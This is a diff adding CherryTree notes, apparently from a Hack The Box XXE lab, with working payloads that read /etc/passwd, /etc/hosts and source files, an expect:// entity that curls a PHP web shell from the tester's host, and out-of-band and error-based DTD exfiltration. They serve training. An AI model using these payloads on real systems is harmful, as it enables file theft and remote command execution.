@@ -1,0 +1,106 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="19" master_id="0" name="XXE (XML)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747167254" ts_lastsave="1747176998">
+    <rich_text>Finding possible vuln. looking burp and checking if we can insert and call entities - if it displays its vuln else it will display &amp;company;
+
+quick test: -&gt; &amp;company; nicht vergessen unten
+
+
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>	
+
+Klassiker für pwd entity.
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+Most files have special characters “&lt;” “&gt;” “?” “”" and break to prevent use php wrapper for base64:
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+1. look for ssh keys, or windows hashes
+
+2. shell: 
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+use curl command to download our shell:
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+make sure to actually replace “ ” with  $IFS
+
+3. Use php filters:
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+4. Other Filter(wraper)
+	but last line needs to come from external so us -&gt; 
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+5. Using Errors:
+Just like in last host:
+
+Inject in Burp:
+
+</rich_text>
+    <codebox char_offset="189" justification="left" frame_width="977" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;!DOCTYPE email [&#13;
+  &lt;!ENTITY company “been pwned”&gt;&#13;
+]&gt;</codebox>
+    <encoded_png char_offset="193" justification="left" link="" sha256sum="63c547ce2b06842e1af817a8fefdf0cebfc01ea4ebc9ec5c450074a667ba78b2"/>
+    <codebox char_offset="223" justification="left" frame_width="977" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;!DOCTYPE email [&#13;
+  &lt;!ENTITY company SYSTEM "file:///etc/passwd"&gt;&#13;
+]&gt;</codebox>
+    <codebox char_offset="326" justification="left" frame_width="977" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;!DOCTYPE email [&#13;
+  &lt;!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;&#13;
+]&gt;</codebox>
+    <codebox char_offset="381" justification="left" frame_width="977" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Momothechi@htb[/htb]$ echo '&lt;?php system($_REQUEST["cmd"]);?&gt;' &gt; shell.php&#13;
+Momothechi@htb[/htb]$ sudo python3 -m http.server 80</codebox>
+    <codebox char_offset="423" justification="left" frame_width="977" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;?xml version="1.0"?&gt;&#13;
+&lt;!DOCTYPE email [&#13;
+  &lt;!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'10.10.14.20:1234/shell.php'"&gt;&#13;
+]&gt;&#13;
+&lt;root&gt;&#13;
+&lt;name&gt;&lt;/name&gt;&#13;
+&lt;tel&gt;&lt;/tel&gt;&#13;
+&lt;email&gt;&amp;company;&lt;/email&gt;&#13;
+&lt;message&gt;&lt;/message&gt;&#13;
+&lt;/root&gt;</codebox>
+    <codebox char_offset="491" justification="left" frame_width="977" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;!DOCTYPE email [&#13;
+  &lt;!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;&#13;
+]&gt;</codebox>
+    <codebox char_offset="571" justification="left" frame_width="977" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">$ echo '&lt;!ENTITY joined "%begin;%file;%end;"&gt;' &gt; xxe.dtd&#13;
+$ python3 -m http.server 8000&#13;
+&#13;
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</codebox>
+    <codebox char_offset="574" justification="left" frame_width="977" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;!DOCTYPE email [&#13;
+&#13;
+  &lt;!ENTITY % begin "&lt;![CDATA["&gt; &lt;!-- prepend the beginning of the CDATA tag --&gt;&#13;
+&#13;
+  &lt;!ENTITY % file SYSTEM "file:///flag.php"&gt; &lt;!-- reference external file --&gt;&#13;
+&#13;
+  &lt;!ENTITY % end "]]&gt;"&gt; &lt;!-- append the end of the CDATA tag --&gt;&#13;
+&#13;
+  &lt;!ENTITY % xxe SYSTEM "http://10.10.14.20:1234/xxe.dtd"&gt; &lt;!-- reference our external DTD --&gt;&#13;
+&#13;
+  %xxe;&#13;
+]&gt;</codebox>
+    <codebox char_offset="618" justification="left" frame_width="977" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;!ENTITY % file SYSTEM "file:///etc/hosts"&gt;&#13;
+&lt;!ENTITY % error "&lt;!ENTITY content SYSTEM '%nonExistingEntity;/%file;'&gt;"&gt;</codebox>
+    <codebox char_offset="636" justification="left" frame_width="977" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;!DOCTYPE email [ &#13;
+  &lt;!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd"&gt;&#13;
+  %remote;&#13;
+  %error;&#13;
+]&gt;</codebox>
+  </node>
+</cherrytree>
